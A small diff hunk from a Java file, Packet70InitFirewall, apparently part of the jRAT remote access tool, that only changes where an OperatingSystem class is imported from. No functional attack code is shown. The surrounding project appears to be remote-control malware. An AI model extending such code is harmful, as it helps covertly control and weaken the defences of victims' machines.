@@ -6,8 +6,9 @@ import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.List;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.common.io.StringWriter;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class Packet70InitFirewall extends AbstractOutgoingPacket {
